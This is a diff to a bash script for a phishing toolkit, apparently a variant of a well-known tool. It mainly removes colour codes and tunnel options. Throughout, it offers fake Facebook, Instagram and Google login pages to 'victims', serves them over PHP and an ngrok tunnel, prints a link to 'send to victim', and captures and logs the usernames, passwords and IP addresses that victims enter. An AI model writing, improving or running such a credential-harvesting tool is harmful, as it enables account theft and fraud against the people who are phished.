@@ -5,12 +5,12 @@ trap user_interrupt SIGINT
 trap user_interrupt SIGTSTP
 
 user_interrupt(){
-        printf "\e[0m\n"
-        printf "\e[0m\e[1;36m\t CTRL + C Pressed !!\n"
+        printf "\n"
+        printf "\t CTRL + C Pressed !!\n"
         sleep 2
-        printf "\e[0m\n"
-        printf " \e[0m\e[1;42m Thanks for Using This Tool !!"
-        printf "\e[0m\n"
+        printf "\n"
+        printf "  Thanks for Using This Tool !!"
+        printf "\n"
         exit 1
 }
 
@@ -39,22 +39,22 @@ fi
 
 reqs() {
 
-command -v php > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
-command -v curl > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
-command -v ssh > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
-command -v unzip > /dev/null 2>&1 || { printf "\n\e[0m\e[96m Packages are not Installed ! type \e[0m\e[93mbash setup\e[0m\n\n"; exit 1; }
+command -v php > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type - bash setup\n\n"; exit 1; }
+command -v curl > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type - bash setup\n\n"; exit 1; }
+command -v ssh > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type - bash setup\n\n"; exit 1; }
+command -v unzip > /dev/null 2>&1 || { printf "\n Packages are not Installed ! type - bash setup\n\n"; exit 1; }
 
 if [[ -d .htr ]]; then
 printf ""
 else
-printf "\n\e[0m\e[96m Packages are not Found ! type \e[0m\e[93mbash setup\e[0m\n\n"
+printf "\n Packages are not Found ! type- bash setup\n\n"
 exit 1 
 fi
 
 if [[ -d .Modules ]]; then
 printf ""
 else
-printf "\n\e[0m\e[96m Packages are not Found ! type \e[0m\e[93mbash setup\e[0m\n\n"
+printf "\n Packages are not Found ! type - bash setup\n\n"
 exit 1 
 fi
 
@@ -95,15 +95,15 @@ printf "***********************************************************\n"
 
 menu() {
 
-printf "      \e[0m\e[1;46m[::]  Select Any Attack for Your Victim  [::]\e[0m\n"
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook    \e[0m\e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[1;93m About\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Instagram   \e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[1;93m Exit\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Google      "
+printf "      [::]  Select Any Attack for Your Victim  [::]\e[0m\n"
+printf "\n"
+printf " [1] Facebook    \t       [99] About\e[0m\n"
+printf " [2] Instagram   [0] Exit\e[0m\n"
+printf " [3] Google      "
 	
 
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option
+printf "\n"
+read -p $'  Select an option: ' menu_option
 
 if [[ $menu_option == 1 || $menu_option == 01 ]]; then
 facebook
@@ -115,13 +115,13 @@ tunnel_menu
 elif [[ $menu_option == 99 ]]; then
 about
 elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
-printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!"
-printf "\e[0m\n"
+printf "\n"
+printf "  Thanks for Using This Tool !!"
+printf "\n"
 exit 1
 
 else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  Invalid option \n"
 sleep 1
 banner
 menu
@@ -131,12 +131,12 @@ fi
 
 facebook(){
 printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
+printf " [1] Traditional Login Page\n"
+printf " [2] Advanced Voting Poll Login Page\n"
+printf " [3] Fake Security Login Page\n"
+printf " [4] Facebook Messenger Login Page\n"
+printf "\n"
+read -p $'  Select an option: ' fb_option
 
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
@@ -153,7 +153,7 @@ website="fb_messenger"
 tunnel_menu
 
 else
-printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n   Invalid option \n"
 sleep 1
 banner
 menu
@@ -162,11 +162,11 @@ fi
 }
 instagram(){
 printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option
+printf " [1] Traditional Login Page\n"
+printf " [2] Auto Followers Login Page\n"
+printf " [3] Blue Badge Verify Login Page\n"
+printf "\n"
+read -p $'  Select an option: ' ig_option
 
 
 if [[ $ig_option == 1 || $ig_option == 01 ]]; then
@@ -180,7 +180,7 @@ website="ig_verify"
 tunnel_menu
 
 else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  Invalid option!! \n"
 sleep 1
 banner
 menu
@@ -189,11 +189,11 @@ fi
 }
 gmail(){
 printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Old Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' gmail_option
+printf " [1] Gmail Old Login Page\n"
+printf " [2] Gmail New Login Page\n"
+printf " [3] Advanced Voting Poll\n"
+printf "\n"
+read -p $'  Select an option: ' gmail_option
 
 
 if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
@@ -207,7 +207,7 @@ website="google_poll"
 tunnel_menu
 
 else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  Invalid option \n"
 sleep 1
 banner
 menu
@@ -221,9 +221,9 @@ about() {
 banner
 smallbanner
 
-printf " \e[0m\e[91m[\e[0m00\e[0m\e[91m]\e[0m\e[93m Home           \e[0m\e[91m[\e[0m99\e[0m\e[91m]\e[0m\e[93m Exit\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' about_option
+printf " [00] Home          [99] Exit\n"
+printf "\n"
+read -p $'  Select an option: ' about_option
 
 if [[ $about_option == 0 || $about_option == 00 ]]; then
 sleep 1
@@ -231,13 +231,13 @@ banner
 menu
 elif [[ $about_option == 99 ]]; then
 sleep 1
-printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
-printf "\e[0m\n"
+printf "\n"
+printf "  Thanks for Using This Tool !!  \n"
+printf "\n"
 exit 1
 
 else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  Invalid option \n"
 sleep 1
 banner
 menu
@@ -263,20 +263,17 @@ cp -f .Modules/ip.php .htr/www/
 def_tunnel_menu="2"
 smallbanner
 printf " Available Port-Forwading Options - "
-printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
-printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
+printf "[1] Ngrok\n"
+printf "\n"
+read -p $'  Select a Port Forwarding option: ' tunnel_menu
 tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
 
+
 if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
-start_localhost
-elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
 start_ngrok
 
-
 else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+printf "\n\n  Invalid option !! \n"
 sleep 1
 banner
 menu
@@ -284,27 +281,15 @@ fi
 
 }
 
-start_localhost() {
 
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m( \e[0m\e[1;96mhttp://127.0.0.1:5555 \e[0m\e[1;92m)\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
-sleep 2
-smallbanner
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://127.0.0.1:5555\e[0m\n"
-
-datafound
-
-}
 
 start_ngrok() {
 
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
+printf "\n"
+printf "  Initializing... http://127.0.0.1:5555 \n"
 sleep 1
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
+printf "\n"
+printf "  Launching Ngrok ...\n"
 cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 ./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
@@ -312,102 +297,10 @@ sleep 7
 ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 
 smallbanner
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ngrok_link
+printf "\n"
+printf "  Send the link to victim : %s \n" $ngrok_link
 
 datafound
-}
-
-
-start_loclx() {
-
-loclx_default_choose_sub="Y"
-loclx_default_sub="$website$RANDOM"
-
-printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Generate Custom Link ? \e[0m\e[1;91m[\e[0m\e[1;92mY\e[0m\e[1;91m/\e[0m\e[1;92mn\e[0m\e[1;91m] : \e[0m\e[1;93m'
-read loclx_choose_sub
-loclx_choose_sub="${loclx_choose_sub:-${loclx_default_choose_sub}}"
-if [[ $loclx_choose_sub == "Y" || $loclx_choose_sub == "y" || $loclx_choose_sub == "Yes" || $loclx_choose_sub == "yes" ]]; then
-loclx_custom_subdomain=true
-sleep 1
-printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input CUSTOM Subdomain : \e[0m\e[1;91m( \e[0m\e[1;92mDefault:\e[0m\e[1;93m %s \e[0m\e[1;91m )\e[0m\e[1;92m: \e[0m\e[1;93m' $loclx_default_sub
-read loclx_subdomain
-loclx_subdomain="${loclx_subdomain:-${loclx_default_sub}}"
-sleep 1
-fi
-
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4142\e[0m\e[1;91m )\e[0m\n"
-sleep 1
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalTunnel ...\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:4142 > /dev/null 2>&1 & 
-if [[ $loclx_custom_subdomain == true ]]; then
-
-./.htr/loclx tunnel http --to :4142 --subdomain $loclx_subdomain > .nexlink 2> /dev/null &
-
-sleep 8
-
-else
-./.htr/loclx tunnel http --to :4142 > .nexlink 2> /dev/null &
-sleep 8
-fi
-loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
-smallbanner
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $loclx_link
-
-datafound
-}
-
-start_localhostrun() {
-
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ...\e[0m\n"
-cd .htr/www && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
-sleep 1
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C to View Login Creds \e[0m\n"
-sleep 1
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
-ssh -R 80:localhost:4545 ssh.localhost.run
-
-printf "\e[0m\n"
-
-printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[1;93m Login Info \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
-printf "\e[0m\n"
-while [ true ]; do
-
-
-if [[ -e ".htr/www/ip.txt" ]]; then
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
-grab_ip
-rm -rf .htr/www/ip.txt
-fi
-sleep 0.75
-if [[ -e ".htr/www/usernames.txt" ]]; then
-account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
-IFS=$'\n'
-password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-cat .htr/www/usernames.txt >> logs/$website.log
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
-printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Exit\e[0m\n"
-rm -rf .htr/www/usernames.txt
-fi
-sleep 0.75
-
-done
-
 }
 
 grab_ip() {
@@ -415,10 +308,10 @@ grab_ip() {
 ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m ip.txt\e[0m\n" $server
+printf "\n"
+printf "  Victim IP: \n" $ip
+printf "\n"
+printf "  Saved: ip.txt\n" $server
 printf "\n"
 cat .htr/www/ip.txt >> ip.txt
 
@@ -429,36 +322,36 @@ grab_creds() {
 account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
-cat .htr/www/usernames.txt >> logs/$website.log
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m logs/%s.log\e[0m\n" $website
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf "    Account: %s" $account
+printf "\n"
+printf "  Password: %s" $password
+cat .htr/www/usernames.txt >> logs/$website.log
+printf "\n"
+printf "  Saved: logs/%s.log" $website
+printf "\n"
+printf "  Waiting for Next Login Info, Ctrl + C to exit.\n"
 
 }
 
 datafound() {
 
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf "  Waiting for Login Info, Ctrl + C to exit.\n"
 printf "\n"
 while [ true ]; do
 
 
 if [[ -e ".htr/www/ip.txt" ]]; then
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
+printf "\n"
+printf "  Victim IP Found !\n"
 grab_ip
 rm -rf .htr/www/ip.txt
 fi
 sleep 0.75
 if [[ -e ".htr/www/usernames.txt" ]]; then
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
+printf "\n"
+printf "  Login info Found !!\n"
 grab_creds
 rm -rf .htr/www/usernames.txt
 fi
